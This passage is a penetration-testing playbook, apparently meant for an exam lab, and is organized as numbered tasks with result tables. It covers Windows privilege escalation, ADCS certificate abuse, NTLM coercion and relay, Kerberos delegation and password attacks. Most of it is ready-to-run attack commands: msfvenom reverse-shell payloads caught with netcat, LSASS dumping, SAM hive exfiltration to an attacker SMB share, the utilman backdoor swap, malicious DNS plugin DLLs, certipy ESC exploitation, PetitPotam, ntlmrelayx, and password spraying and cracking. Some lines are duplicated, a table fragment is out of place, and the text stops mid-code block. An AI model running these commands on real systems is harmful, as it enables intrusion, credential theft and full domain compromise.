## WIN-04. Confirm, back up and test one service binary

Enter for one exact service on a disposable lab.

```text
sc.exe qc "<SERVICE_NAME>"
icacls "<FILE_PATH>"
icacls "<PARENT>"
whoami /groups
```

Back up without overwriting, then verify the hash:

```powershell
if (Test-Path -LiteralPath '<BACKUP>') { throw 'exists' }
[IO.File]::Copy('<FILE_PATH>', '<BACKUP>', $false)
(Get-FileHash -LiteralPath '<FILE_PATH>' -Algorithm SHA256).Hash -eq (Get-FileHash -LiteralPath '<BACKUP>' -Algorithm SHA256).Hash
```

Stage a payload, start a listener, replace, then trigger:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST='<KALI_IP>' LPORT='<PORT>' -f exe -o payload.exe
python3 -m http.server '<HTTP_PORT>' --bind '<KALI_IP>'
# second terminal, before the trigger
nc -lvnp '<PORT>'
```

```powershell
Invoke-WebRequest 'http://<KALI_IP>:<HTTP_PORT>/payload.exe' -OutFile '<STAGE>'
```

```powershell
Copy-Item -LiteralPath '<STAGE>' -Destination '<FILE_PATH>' -Force
sc.exe stop "<SERVICE_NAME>"; sc.exe start "<SERVICE_NAME>"
```

Restore immediately after: copy the backup back, compare its hash, then `Remove-Item` the backup and stage.

| Result | Next |
| --- | --- |
| New token on the assigned host, service restored | **WIN-01**. |
| Prerequisite missing | **WIN-02**. |
| Trigger ran, no new process | **PAUSE-COVERAGE**. |
| Restore incomplete | **PAUSE-RECOVERY**. |

## WIN-05. Confirm, back up and test one scheduled binary

Same procedure as WIN-04 for one exact task:

```text
schtasks /query /tn "<TASK_NAME>" /fo LIST /v
icacls "<FILE_PATH>"
icacls "<PARENT>"
whoami /groups
```

Use the WIN-04 backup/verify block, replace the file, start the listener, then `schtasks /run /tn "<TASK_NAME>"`. Restore and verify the original hash afterwards.

| Result | Next |
| --- | --- |
| New token, task behaviour restored | **WIN-01**. |
| Run-as or write missing | **WIN-02**. |
| No new process | **PAUSE-COVERAGE**. |
| Restore uncertain | **PAUSE-RECOVERY**. |

## WIN-06. Attribute one application or autorun lead before researching it

```powershell
Get-ItemProperty 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*','HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*','HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*' -ErrorAction SilentlyContinue |
  Where-Object { $_.DisplayName -eq '<APP>' } | Select-Object DisplayName, DisplayVersion, Publisher, InstallLocation
```

Then check the exact file and parent ACL as in WIN-02.

| Result | Next |
| --- | --- |
| Version, path, named elevated consumer | **WIN-04**, **WIN-05** or the reviewed application route. |
| Present, no consumer | **WIN-02** or **PAUSE-COVERAGE**. |
| Writable, context unknown | **GAP-WINDOWS**. |

## WIN-07. Are both AlwaysInstallElevated policy gates enabled?

```powershell
reg.exe query 'HKLM\Software\Policies\Microsoft\Windows\Installer' /v AlwaysInstallElevated
reg.exe query 'HKCU\Software\Policies\Microsoft\Windows\Installer' /v AlwaysInstallElevated
```

| Result | Next |
| --- | --- |
| Both `0x1` | **WPRIV-01**. |
| Either missing or `0x0` | **WIN-02**. |
| Denied | **PAUSE-COVERAGE**. |

## WIN-08. Check one reviewed impersonation attempt

```powershell
sc.exe query Spooler
(Get-FileHash -LiteralPath '<PRINTSPOOFER>' -Algorithm SHA256).Hash
& '<PRINTSPOOFER>' -i -c cmd.exe
```

In the child: `hostname; whoami /all`. Remove the tool only if you staged it.

| Result | Next |
| --- | --- |
| SYSTEM on the assigned host | **WIN-01**. |
| Controller machine account | **WIN-01**; it is not SYSTEM. |
| No changed child | **WIN-02**. |
| Error | **PAUSE-COVERAGE**. |

## WIN-15. Make one reviewed unstable Windows attempt

Enter after WIN-13/14 with a tested reset path.

```powershell
& '<STAGED_ARTIFACT>'
hostname; whoami /all
```

| Result | Next |
| --- | --- |
| New attributed token | **WIN-01**; reset stays owed. |
| Crash or partial transition | **PAUSE-RECOVERY**. |
| No changed process | **PAUSE-COVERAGE**, reset first. |

## WIN-09. Keep one recoverable accessibility-binary test

Enter with `SeRestorePrivilege`, a trusted RDP path and a tested reset.

```powershell
& '<SERESTORE_HELPER>'
$source='C:\Windows\System32\utilman.exe'; $backup="$env:USERPROFILE\Documents\utilman.exe.owbak"
[IO.File]::Copy($source, $backup, $false)
Rename-Item -LiteralPath $source -NewName 'utilman.exe.old'
Rename-Item -LiteralPath 'C:\Windows\System32\cmd.exe' -NewName 'utilman.exe'
```

Trigger Windows+U at the RDP logon screen, run `hostname; whoami /all`, then restore both renames and compare hashes.

| Result | Next |
| --- | --- |
| SYSTEM and original bytes/behaviour verified | **WIN-01**. |
| Prerequisite missing | **WIN-02**. |
| No new token | **PAUSE-COVERAGE** after restore. |
| Restore uncertain | **PAUSE-RECOVERY**. |

## WIN-10 Start a process with one known plaintext credential

```text
rlwrap nc -lvnp <LPORT>
& '<RUNASCS>' '<USERNAME>' '<PASSWORD>' cmd.exe -d '<DOMAIN>' -r '<KALI_IP>:<LPORT>'
```

Drop `-d '<DOMAIN>'` for a local account. Verify with `whoami /all`.

| Result | Next |
| --- | --- |
| Intended identity | **WIN-01**. |
| No callback | **PAUSE-COVERAGE**. |
| Wrong identity | **AD-03**. |

## WIN-11. Test one SeManageVolume path with a reset owed

Enter with `SeManageVolumePrivilege` and a tested reset. Back up `C:\Windows\System32\wbem\tzres.dll` if present, run the reviewed helper, stage a matching DLL, then trigger with `systeminfo`:

```powershell
& '<SEMANAGEVOLUME_HELPER>'
Copy-Item -LiteralPath '<STAGE>' -Destination 'C:\Windows\System32\wbem\tzres.dll' -Force
systeminfo
```

Restore the backup, or remove the DLL if it was absent, and reset the broad ACL afterwards.

| Result | Next |
| --- | --- |
| Callback and DLL restored/removed | **WIN-01**; reset stays owed. |
| Gate fails before trigger | **WIN-02** after any reset. |
| No callback | Restore, then **PAUSE-COVERAGE**. |
| Custody or reset uncertain | **PAUSE-RECOVERY**. |

## WIN-12. Verify and contain one Windows loopback service

```powershell
Get-NetTCPConnection -State Listen | Where-Object { $_.LocalAddress -eq '127.0.0.1' } | Select-Object LocalPort, OwningProcess
& '<CHISEL>' 'client' 'http://<KALI_IP>:<PORT>' 'R:127.0.0.1:<LOCAL_PORT>:127.0.0.1:<REMOTE_PORT>'
```

On Kali: `chisel server --reverse --port '<PORT>'`, then `nmap -sT -Pn -p '<LOCAL_PORT>' 127.0.0.1`. Stop both processes after the check.

| Result | Next |
| --- | --- |
| Forwarded port answers | Matching service task; **AD-20** for MSSQL. |
| Listener unclear | **PAUSE-COVERAGE**. |
| Port open, protocol unknown | **GAP-SERVICE**. |
| Port does not close | **PAUSE-RECOVERY**. |
| Forwarded service lives on another internal host | **PIVOT-01**. |

## WPRIV-01. Does the enabled installer policy yield the intended Windows token?

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST='<KALI_IP>' LPORT='<LPORT>' -f msi -o proof.msi
sha256sum proof.msi
python3 -m http.server '<HTTP_PORT>' --bind '<KALI_IP>'
```

```powershell
New-Item -ItemType Directory -Path 'C:\Users\Public\owb-msi' -ErrorAction Stop
Invoke-WebRequest -Uri 'http://<KALI_IP>:<HTTP_PORT>/proof.msi' -OutFile 'C:\Users\Public\owb-msi\proof.msi'
(Get-FileHash -LiteralPath 'C:\Users\Public\owb-msi\proof.msi' -Algorithm SHA256).Hash
```

Start `ncat --listen '<KALI_IP>' '<LPORT>'` in a second terminal, then install:

```powershell
msiexec.exe /i 'C:\Users\Public\owb-msi\proof.msi' /qn /norestart
```

In the callback: `hostname; whoami /all`.

| Result | Next |
| --- | --- |
| Assigned host and higher token | **WIN-01**. |
| Original token | **PAUSE-COVERAGE**. |
| No callback or installer error | **PAUSE-COVERAGE**. |
| Unexpected installed state | **PAUSE-RECOVERY**. |

Cleanup: read the install log, remove the MSI and log, remove the directory, and delete the local MSI.

## WPRIV-02. Can SeBackupPrivilege read the registry hives?

With the privilege enabled, copy the hives with backup semantics:

```cmd
robocopy /b C:\Windows\System32\config C:\Windows\Temp\owb-backup SAM SYSTEM SECURITY
```

Serve a local SMB share on Kali and pull the three hives:

```bash
impacket-smbserver owb . -smb2support
```

```cmd
copy C:\Windows\Temp\owb-backup\SAM \\<KALI_IP>\owb\
copy C:\Windows\Temp\owb-backup\SYSTEM \\<KALI_IP>\owb\
copy C:\Windows\Temp\owb-backup\SECURITY \\<KALI_IP>\owb\
```

```bash
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
```

| Result | Next |
| --- | --- |
| Local account hashes extracted | **PASS-02** or pass-the-hash at **AD-03** with `-H`. |
| Copy denied despite the privilege | Recheck the token at **WIN-01**. |
| Hive copy incomplete | **PAUSE-COVERAGE**. |

Remove the three Windows hives, the Kali copies, and stop the SMB server afterwards.

## WPRIV-03. Can SeTakeOwnershipPrivilege open one protected file?

```cmd
takeown /f "<FILE_PATH>"
icacls "<FILE_PATH>" /grant "<USERNAME>:F"
type "<FILE_PATH>"
```

Change `/grant` to a group only when the file must stay readable for others.

| Result | Next |
| --- | --- |
| File readable | **WIN-03** if it is a credential source, otherwise **NET-05**. |
| Still denied | Check the token and the file ACL again at **WIN-01**. |
| Path missing | **PAUSE-COVERAGE**. |

Restore ownership only if the task changed a system file: `icacls "<FILE_PATH>" /setowner "NT SERVICE\TrustedInstaller"`.

## WPRIV-04. Can SeDebugPrivilege dump LSASS?

```powershell
Get-Process lsass | Select-Object -ExpandProperty Id
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <PID> C:\Windows\Temp\lsass.dmp full
```

Pull the dump and parse it on Kali:

```bash
pypykatz lsa minidump lsass.dmp
```

| Result | Next |
| --- | --- |
| Credential material recovered | **PASS-02**, or **AD-03** with a hash. |
| Dump fails or is truncated | **PAUSE-COVERAGE**; check the PID and path. |
| No material | Record the extent; **WIN-02**. |

Delete `lsass.dmp` on both sides after parsing.

## WPRIV-05. Can an elevated task run as SYSTEM?

```cmd
schtasks /create /tn owb /tr "cmd /c <COMMAND>" /sc once /st 23:59 /ru SYSTEM
schtasks /run /tn owb
schtasks /delete /tn owb /f
```

Use a command that writes proof, such as `whoami /all > C:\Windows\Temp\owb.txt`.

| Result | Next |
| --- | --- |
| Output shows SYSTEM | **WIN-01** on the new context, or use the output as proof. |
| Create denied | Need an elevated token; **WIN-02**. |
| Task runs, no output | **PAUSE-COVERAGE**. |

Remove the output file after reading it.

## WPRIV-06. Can a startup folder launch your file?

```powershell
Copy-Item 'C:\Users\Public\payload.exe' "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\owb.exe"
```

Another administrator must sign in for the file to run.

| Result | Next |
| --- | --- |
| Process runs after logon | **WIN-01**. |
| Nothing starts | Check the folder ACL and the logon event; **PAUSE-COVERAGE**. |

Delete the file when done.

## WPRIV-07. Is a reviewed driver loadable with SeLoadDriverPrivilege?

Enter with the privilege, an elevated token and a reviewed vulnerable driver and loader.

```cmd
sc.exe create owbdrv type= kernel binPath= C:\Windows\Temp\driver.sys
sc.exe start owbdrv
sc.exe query owbdrv
```

Run the reviewed loader against the loaded driver, then remove it:

```cmd
sc.exe stop owbdrv
sc.exe delete owbdrv
```

| Result | Next |
| --- | --- |
| Driver loads and the loader returns a token | **WIN-01** in that context. |
| `sc` denies the load | Check integrity and path; **WIN-01**. |
| Loader fails | **EXP-01** for the driver/loader pair. |

## WPRIV-08. Are SeCreateToken or SeAssignPrimaryToken usable?

Enter with either privilege and an existing high-value token.

```cmd
incognito.exe list_tokens -u
incognito.exe execute -c "NT AUTHORITY\SYSTEM" cmd.exe
```

`SeTcbPrivilege` alone is not enough to mint a token; use it with a reviewed token tool.

| Result | Next |
| --- | --- |
| SYSTEM shell | **WIN-01**. |
| Token listed but execute denied | Check the exact privilege; **PAUSE-COVERAGE**. |
| No token listed | **WIN-02**. |

## WPRIV-09. Is UAC standing between an admin token and elevation?

```cmd
whoami /groups | findstr /i "Label"
```

A Medium mandatory label while the account is in Administrators means filtered admin. Run a reviewed UACME build:

```cmd
Akagi64.exe 23 C:\Windows\System32\cmd.exe
```

| Result | Next |
| --- | --- |
| High-integrity shell | **WIN-01**. |
| Still Medium | Try another method ID once; **PAUSE-COVERAGE**. |
| Account is not admin | **WIN-02**. |

## WPRIV-10. Can DPAPI credentials be decrypted?

```cmd
dir /a "%APPDATA%\Microsoft\Credentials"
dir /a "%LOCALAPPDATA%\Microsoft\Credentials"
```

With the current user's context, parse one file with a reviewed tool:

```cmd
SharpDPAPI.exe credentials /target:%APPDATA%\Microsoft\Credentials\<FILE>
```

Mimikatz equivalent: `dpapi::cred /in:"<FILE>"`. A masterkey is needed for a different user.

| Result | Next |
| --- | --- |
| Plaintext credential | **AD-03** or **WIN-10**. |
| Blob needs another user's masterkey | Record the file; **GAP-ACCESS**. |
| No files | **WIN-03**. |

# adcs


`certipy-ad` is a Kali package; keep issued PFX files in a private directory.

`certipy-ad` is a Kali package; keep issued PFX files in a private directory.

ADCS is a certificate-service path on the domain controller. Use only on an authorized disposable set.

## ADCS-01. Is a CA reachable and which templates are vulnerable?

```bash
certipy-ad find -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -dc-ip '<DC_IP>' -vulnerable -stdout
```

Read the CA name, template names, enrolment rights and the reported ESC classes. A flagged template still needs its rights and input requirements to match.

| Result | Next |
| --- | --- |
| ESC1 with enrol rights | **ADCS-02**. |
| ESC8 or a web enrolment endpoint | **ADCS-04**, then **RELAY-02**. |
| ESC4 writable template | **ADCS-05**. |
| ESC7 CA officer gap | **ADCS-06**. |
| ESC3 enrolment-agent template | **ADCS-07**. |
| ESC2 Any-Purpose template | **ADCS-08**. |
| ESC5 CA object control or ESC11 RPC relay | **ADCS-09**. |
| ESC9/ESC10 weak mapping | **ADCS-10**. |
| Nothing vulnerable | **AD-09** for another right. |
| Find denied | **PAUSE-COVERAGE**. |

## ADCS-02. Can one certificate be issued for a higher principal?

```bash
certipy-ad req -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA_NAME>' -template '<TEMPLATE>' -upn 'administrator@<DOMAIN>' -dc-ip '<DC_IP>'
```

A returned `.pfx` is issued material, not a session.

| Result | Next |
| --- | --- |
| `.pfx` written | **ADCS-03**. |
| Request denied or template mismatch | **ADCS-01** with the exact reason. |
| CA or DC unreachable | **PAUSE-ROUTE**. |

The request leaves a `.pfx`; delete it after authentication if unused: `rm -i administrator.pfx`.

## ADCS-03. Does the certificate authenticate as that principal?

```bash
certipy-ad auth -pfx 'administrator.pfx' -dc-ip '<DC_IP>'
```

This returns a TGT and, for a DC-issued cert, often the account's NT hash.

| Result | Next |
| --- | --- |
| ccache or hash for the intended account | **AD-03** for one host, or **AD-13** if admin is indicated. |
| Auth fails | **ADCS-01**; check UPN, template and issuance time. |
| Clock or DC mismatch | **PAUSE-ROUTE**. |

Remove the issued material when done: `rm -i administrator.pfx administrator.ccache`.

## ADCS-04. Is web enrolment exposed?

```bash
curl -sS -i 'http://<CA_HOST>/certsrv/'
certipy-ad find -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -dc-ip '<DC_IP>' -stdout | grep -i 'web enrollment'
```

An exposed `/certsrv` with NTLM auth is the ESC8 precondition.

| Result | Next |
| --- | --- |
| Endpoint answers with NTLM or basic auth | **RELAY-02** against the CA. |
| Endpoint absent | **ADCS-02** for the template path. |

## ADCS-05. Is a template ACL writable (ESC4)?

Enter when ADCS-01 flags ESC4 on a template.

```bash
certipy-ad find -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -dc-ip '<DC_IP>' -vulnerable -stdout | grep -i ESC4
certipy-ad template -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -template '<TEMPLATE>' -write-default-configuration -dc-ip '<DC_IP>'
```

Then request through **ADCS-02**. The write lowers the template to an exploitable state.

| Result | Next |
| --- | --- |
| Template write succeeds | **ADCS-02** with that template. |
| Write denied | **ADCS-01**; the ACL does not match. |
| Template breaks | Record the output; **PAUSE-RECOVERY**. |

## ADCS-06. Are CA officer rights missing (ESC7)?

```bash
certipy-ad ca -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA_NAME>' -add-officer '<USERNAME>' -dc-ip '<DC_IP>'
certipy-ad ca -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA_NAME>' -enable-template '<TEMPLATE>' -dc-ip '<DC_IP>'
```

Request the certificate, then approve and retrieve it with the returned request ID:

```bash
certipy-ad req -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA_NAME>' -template '<TEMPLATE>' -upn 'administrator@<DOMAIN>' -dc-ip '<DC_IP>'
certipy-ad ca -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA_NAME>' -issue-request <REQUEST_ID> -dc-ip '<DC_IP>'
certipy-ad req -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA_NAME>' -retrieve <REQUEST_ID> -dc-ip '<DC_IP>'
```

| Result | Next |
| --- | --- |
| Certificate retrieved | **ADCS-03**. |
| Officer add denied | **ADCS-01**; no ManageCA right. |
| Issue or retrieve fails | **PAUSE-COVERAGE** with the request ID. |

## ADCS-07. Is enrolment-agent delegation available (ESC3)?

```bash
certipy-ad req -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA_NAME>' -template 'EnrollmentAgent' -dc-ip '<DC_IP>'
certipy-ad req -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA_NAME>' -template 'User' -on-behalf-of '<DOMAIN>\administrator' -pfx agent.pfx -dc-ip '<DC_IP>'
```

| Result | Next |
| --- | --- |
| Certificate for the target principal | **ADCS-03**. |
| No agent template | **ADCS-01**. |
| On-behalf-of denied | **PAUSE-COVERAGE**. |

Remove `agent.pfx` and the issued `.pfx` afterwards.

## ADCS-08. Is an Any-Purpose template available (ESC2)?

**Optional.** Safe to skip under exam time pressure.

**Optional.** Safe to skip under exam time pressure.

Enter when ADCS-01 flags ESC2 and you can enrol.

```bash
certipy-ad req -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA_NAME>' -template '<TEMPLATE>' -dc-ip '<DC_IP>'
```

An Any-Purpose certificate authenticates as you for any service. For another principal, ESC2 alone is not enough unless the template also allows a subject.

| Result | Next |
| --- | --- |
| Certificate issued | **ADCS-03** for your own identity. |
| Subject not allowed | Chain it with **ADCS-10**. |
| Enrol denied | **ADCS-01**. |

## ADCS-09. Is the CA object or RPC interface controllable (ESC5/ESC11)?

**Optional.** Safe to skip under exam time pressure.

**Optional.** Safe to skip under exam time pressure.

ESC5 needs write rights on the CA object or its configuration. Check with the find output, then grant yourself officer:

```bash
certipy-ad ca -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA_NAME>' -add-officer '<USERNAME>' -dc-ip '<DC_IP>'
```

ESC11 relays NTLM to the CA's RPC interface, so use **RELAY-02** with `-t 'http://<CA_HOST>'` or the RPC relay target from the reviewed tool.

| Result | Next |
| --- | --- |
| Officer granted | **ADCS-06**. |
| Only ESC11 reported | **RELAY-02** against the CA. |
| Neither right | **ADCS-01**. |

## ADCS-10. Is certificate mapping weak (ESC9/ESC10)?

**Optional.** Safe to skip under exam time pressure.

**Optional.** Safe to skip under exam time pressure.

With strong mapping disabled, request a certificate carrying the target UPN, then authenticate with the target name:

```bash
certipy-ad req -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA_NAME>' -template '<TEMPLATE>' -upn 'administrator@<DOMAIN>' -dc-ip '<DC_IP>'
certipy-ad auth -pfx administrator.pfx -username administrator -domain '<DOMAIN>' -dc-ip '<DC_IP>'
```

| Result | Next |
| --- | --- |
| Auth returns the target's TGT/hash | **AD-03** or **AD-13**. |
| Mapping still strong | Use **ADCS-02** with a subject-enabled template. |
| Auth fails | **PAUSE-COVERAGE**; check the UPN and CA name. |

# ad_abuse


Stage Responder, impacket, `PetitPotam.py` and `printerbug.py` from Kali or GitHub; `dnstool.py` is part of krbrelayx.

Stage Responder, impacket, `PetitPotam.py` and `printerbug.py` from Kali or GitHub; `dnstool.py` is part of krbrelayx.

Coercion, relay, delegation and domain trusts. Each task assumes a validated domain identity and an attributed target.

## COERCE-01. Does the target authenticate to a listener?

Start a capture first: reuse the RELAY-01 capture, or start it here.

```bash
responder -I '<IFACE>' -A
```

Then coerce one target:

```bash
python3 PetitPotam.py -d '<DOMAIN>' -u '<USERNAME>' -p '<PASSWORD>' '<KALI_IP>' '<TARGET_IP>'
python3 printerbug.py '<DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP>' '<KALI_IP>'
```

A captured NetNTLMv2 hash proves coercion.

| Result | Next |
| --- | --- |
| Hash captured | **PASS-02** to crack it, or **RELAY-02** to relay it. |
| Capture passively before coercing | **RELAY-01**. |
| No authentication arrives | Check the interface and target service; **PAUSE-COVERAGE**. |
| RPC denied | **AD-03** on another host. |

Stop the capture with Ctrl-C after one attempt.

## RELAY-01. Can NetNTLM be captured without coercion?

```bash
responder -I '<IFACE>' -A
```

Leave it running while normal traffic and a coerce run. `-A` analyses instead of answering, so it will not break SMB.

| Result | Next |
| --- | --- |
| NetNTLMv2 from a user or machine | **PASS-02** or **RELAY-02**. |
| Nothing in the window | **COERCE-01** for a deliberate trigger. |

Stop the capture with Ctrl-C when the window closes.

## RELAY-02. Can the authentication be relayed?

SMB signing must be off on the target. Relay to LDAP for a machine account and RBCD:

```bash
ntlmrelayx.py -t ldaps://'<DC_IP>' -smb2support --delegate-access
```

Use `--delegate-access` to create a new machine account and grant it RBCD, or this form to escalate an existing controlled computer:

```bash
ntlmrelayx.py -t ldaps://'<DC_IP>' -smb2support --escalate-user '<CONTROLLED_COMPUTER>$'
```

Run **COERCE-01** against a target in the same window, then read the delegation. Stop the relay with Ctrl-C.

| Result | Next |
| --- | --- |
| Machine account created and RBCD set | **AD-16** for the ticket and shell path. |
| LDAP signing required | Relay to SMB or HTTP instead, or **PAUSE-COVERAGE**. |
| SMB signing enforced | Record it; relay that host by LDAP/HTTP or pick another target. |
| No authentication | **COERCE-01**. |

## DELEG-01. Which delegation rights exist?

```bash
impacket-findDelegation '<DOMAIN>/<USERNAME>:<PASSWORD>' -dc-ip '<DC_IP>'
ldapsearch -x -H 'ldap://<DC_IP>' -D '<USERNAME>@<DOMAIN>' -w '<PASSWORD>' -b '<BASE_DN>' \
  '(|(userAccountControl:1.2.840.113556.1.4.803:=524288)(msDS-AllowedToDelegateTo=*))' \
  sAMAccountName userAccountControl msDS-AllowedToDelegateTo
```

Bit 524288 is unconstrained; `msDS-AllowedToDelegateTo` is constrained.

| Result | Next |
| --- | --- |
| Unconstrained account you control or can use | **DELEG-03**. |
| Constrained entry with an interesting SPN | **DELEG-02**. |
| No protocol transition, but a service ticket is obtainable | **DELEG-04**. |
| Only RBCD rights | **AD-16**. |

## DELEG-02. Can constrained delegation be abused?

With protocol transition (`TRUSTED_TO_AUTH_FOR_DELEGATION`) and a service secret:

```bash
impacket-getST -spn '<TARGET_SPN>' -impersonate administrator -dc-ip '<DC_IP>' '<DOMAIN>/<SVC_ACCOUNT>:<PASSWORD>'
# or with the service NT hash
impacket-getST -spn '<TARGET_SPN>' -impersonate administrator -dc-ip '<DC_IP>' -hashes ':<NTLM_HASH>' '<DOMAIN>/<SVC_ACCOUNT>'
KRB5CCNAME='administrator.ccache' impacket-psexec -k -no-pass '<DOMAIN>/administrator@<TARGET_HOST>'
```

Without protocol transition you need a service ticket for the delegating account first.

| Result | Next |
| --- | --- |
| Ticket usable for the SPN | **WIN-01** in the shell. |
| `KDC_ERR_BADOPTION` | No protocol transition; get a service ticket first or **PAUSE-COVERAGE**. |
| Wrong SPN | **DELEG-01** for the recorded value. |

## DELEG-03. Can unconstrained delegation be captured?

On the delegating host, monitor for tickets:

```powershell
& '<RUBEUS>' monitor /interval:5 /nowrap
```

Coerce the DC to that host with **COERCE-01**, then submit the captured ticket:

```powershell
& '<RUBEUS>' ptt /ticket:<BASE64_TICKET>
klist
```

| Result | Next |
| --- | --- |
| DC ticket in the cache | **AD-11** with the DC identity, or **AD-13** on the DC. |
| No ticket | Check the account really has unconstrained delegation; **PAUSE-COVERAGE**. |
| Coercion failed | **COERCE-01** on the host. |

## TRUST-01. Is a domain trust reachable with this principal?

```cmd
nltest /domain_trusts /all_trusts
```

From Kali, test the trusted domain only with an identity valid there:

```bash
impacket-GetADUsers '<TRUSTED_DOMAIN>/<USERNAME>' -dc-ip '<TRUSTED_DC_IP>'
impacket-getTGT '<TRUSTED_DOMAIN>/<USERNAME>:<PASSWORD>' -dc-ip '<TRUSTED_DC_IP>'
```

| Result | Next |
| --- | --- |
| Trust listed and the identity authenticates | **AD-03** against the trusted domain. |
| Trust listed, identity invalid there | **PAUSE-COVERAGE**; a trust does not grant access. |
| No trust | **AD-09** for a local right. |

## ADIDNS-01. Can a DNS record be added?

Enter with write rights over the AD-integrated zone.

```bash
python3 dnstool.py -u '<DOMAIN>\<USERNAME>' -p '<PASSWORD>' -r '<NAME>' -a add -t A -d '<KALI_IP>' '<DC_IP>'
nslookup '<NAME>' '<DC_IP>'
```

| Result | Next |
| --- | --- |
| Record resolves to Kali | Point the service that trusts that name at you. |
| Add denied | **GAP-ACCESS**. |
| Existing record | Use `-a modify` once. |

## DNSADM-01. Is the DNS service loading an arbitrary DLL?

Enter with `dnsAdmins` membership and a copy of `dnscmd`.

```cmd
dnscmd <DC_HOST> /config /serverlevelplugindll \\<KALI_IP>\owb\evil.dll
sc.exe \\<DC_HOST> stop dns
sc.exe \\<DC_HOST> start dns
nslookup <DC_HOST>
```

Serve the DLL from Kali with `impacket-smbserver owb . -smb2support`. The DLL runs as the DNS service.

| Result | Next |
| --- | --- |
| Callback on `nslookup` | **WIN-01** via **EXP-03**. |
| No callback | Check the UNC path and SMB access; **PAUSE-COVERAGE**. |
| Config denied | **GAP-ACCESS**. |

## SHADOW-01. Can shadow credentials be added?

Enter with write rights on the target account (`GenericWrite`/`GenericAll`).

```bash
certipy-ad shadow auto -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -account '<TARGET_ACCOUNT>' -dc-ip '<DC_IP>'
```

| Result | Next |
| --- | --- |
| Key credential and auth material returned | **AD-03** on one host. |
| Write denied | **AD-09**; the edge is wrong. |
| Auth fails | **PAUSE-COVERAGE**. |

## DELEG-04. Is delegation usable without protocol transition?

Enter with constrained delegation but no `TRUSTED_TO_AUTH_FOR_DELEGATION`. You need a service ticket for the delegating account first:

```bash
impacket-getST -spn '<DELEGATING_SPN>' '<DOMAIN>/<SVC_ACCOUNT>:<PASSWORD>' -dc-ip '<DC_IP>'
impacket-getST -spn '<TARGET_SPN>' -impersonate administrator -additional-ticket '<SERVICE_TICKET>' -dc-ip '<DC_IP>'
KRB5CCNAME='administrator.ccache' impacket-psexec -k -no-pass '<DOMAIN>/administrator@<TARGET_HOST>'
```

| Result | Next |
| --- | --- |
| Target ticket issued | **WIN-01** in the shell. |
| `KDC_ERR_BADOPTION` | Check the SPN pair and the delegating ticket. |
| Ticket mismatch | **PAUSE-COVERAGE**. |

# password_attacks


Spray, guess or crack one credential source at a time.

## PASS-01. Can one password be sprayed safely?

Read the lockout policy before spraying:

```bash
nxc smb '<DC_IP>' -u '<USERNAME>' -p '<PASSWORD>' --pass-pol
```

Then try one password against the user list, stopping on the first success per account:

```bash
nxc smb '<DC_IP>' -u users.txt -p '<PASSWORD>' --continue-on-success
```

| Result | Next |
| --- | --- |
| One or more valid logins | **AD-03** with each identity, one host at a time. |
| All fail, policy allows more | One other evidence-based password, not a wordlist. |
| Lockout risk | Respect the threshold minus one; **PAUSE-COVERAGE**. |

## PASS-02. Can a captured hash be identified and cracked?

```bash
hashid '<HASH>'
hashcat -m 1000 '<NTLM_HASH>' /usr/share/wordlists/rockyou.txt
hashcat -m 5600 '<NETNTLMv2_HASH>' /usr/share/wordlists/rockyou.txt
hashcat -m 7300 '<IPMI_HASH>' /usr/share/wordlists/rockyou.txt
```

`-m 1000` is NTLM, `-m 5600` is NetNTLMv2, `-m 7300` is IPMI2 RAKP HMAC-SHA1. `--show` lists a recovered value.

| Result | Next |
| --- | --- |
| Plaintext recovered | **AD-03** for one host, or **WIN-10** for a process switch. |
| Not in rockyou | Record it; **PAUSE-COVERAGE** or a selected rule set. |

`--show` lists recovered values; delete the hash file when done.
| Wrong mode | **hashid** output again; do not try every mode. |
| NTLM used directly | Pass-the-hash at **AD-03** with `-H`. |

## PASS-03. Can one observed service account be guessed from a short list?

Enter when: **SSH-01**, **FTP-01** or another service check answered but supplied no usable credential, and a likely username or short user list exists.

Start with the known suspicious account and one list; stop at the first success:

```bash
ncrack --user '<USERNAME>' -P /usr/share/wordlists/rockyou.txt -f -v '<SERVICE>://<TARGET_IP>'
```

For a short user list, keep the same password list:

```bash
ncrack -U users.txt -P /usr/share/wordlists/rockyou.txt -f -v '<SERVICE>://<TARGET_IP>'
```

For both lists, use the collected accounts and passwords:

```bash
ncrack -U users.txt -P passwords.txt -f -v '<SERVICE>://<TARGET_IP>'
```

Replace `<SERVICE>` with the observed protocol: `ssh`, `ftp`, `rdp` or `telnet`. Add the port as `'ssh://<TARGET_IP>:<PORT>'` when it is non-standard.

| Result | Next |
| --- | --- |
| Credential pair reported | The matching protocol check: **SSH-02**, **FTP-01**, **RDP-01** or **DB-01**. |
| Every pair in the list fails | **NET-05**; the list is exhausted, not the service. |
| Lockout risk on a domain account | Read the policy at **PASS-01** before a larger list. |
| Connection refused or protocol error | **NET-03** to confirm the port and scheme. |

## PASS-04. Can a web login form be guessed with hydra?

Enter when: **WEB-08** captured a login POST and its failure response.

Confirm the exact path, field names and failure string with a known-bad pair first:

```bash
